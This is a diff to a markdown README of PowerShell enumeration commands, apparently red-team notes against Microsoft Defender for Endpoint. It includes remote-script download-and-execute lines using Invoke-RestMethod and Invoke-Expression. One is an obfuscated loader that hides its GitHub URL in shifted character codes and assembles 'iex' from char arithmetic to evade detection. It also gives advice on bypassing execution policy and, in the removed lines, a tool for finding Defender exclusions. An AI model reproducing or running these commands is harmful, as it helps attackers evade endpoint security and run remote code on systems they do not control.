@@ -53,18 +53,14 @@ A collection of enumeration procedures.
   Invoke-Expression "& { $(Invoke-RestMethod https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1) } --enum C:\Windows 3"
   ```
 
-* ps1-obfuscator and fkmde:
+* ps1-obfuscator and fkmde.ps1:
   ```powershell
   powershell -Command "new-alias ravnl curl; $bcutn = @(8891,8903,8903,8899,8902,8845,8834,8834,8901,8884,8906,8833,8890,8892,8903,8891,8904,8885,8904,8902,8888,8901,8886,8898,8897,8903,8888,8897,8903,8833,8886,8898,8896,8834,8889,8894,8907,8887,8901,8834,8889,8894,8896,8887,8888,8834,8896,8884,8892,8897,8834,8889,8894,8896,8887,8888,8833,8899,8902,8836); $qsnln = ''; foreach ($asciiValue in $bcutn) { $decodedChar=[char]($asciiValue-8787); $qsnln+=$decodedChar; }; .([char](9992-9887)+'e'+'x')(ravnl -useb $qsnln)"
   ```
-* ps. if unable to run a script on the current system, an execution policy has to be set.
+  
+* ps. if unable to run a script on the current system, an execution policy has to be set. You can bypass this with -nop or set the policy by hand
   ```
   Set-ExecutionPolicy Unrestricted -Scope CurrentUser
-  ```
-
-* [SharpExclusionFinder](https://github.com/Friends-Security/SharpExclusionFinder) for Windows Defender folder exclusions through MpCmdRun.exe, but detected by MDE. So an exclusion for the tool is needed, or can be used as PoC.
-  ```
-  SharpExclusionFinder.exe "C:\MyDirectory" --max-threads 5 --depth 3 --output scan_log.txt
   ```
 
 ## ASR Rules
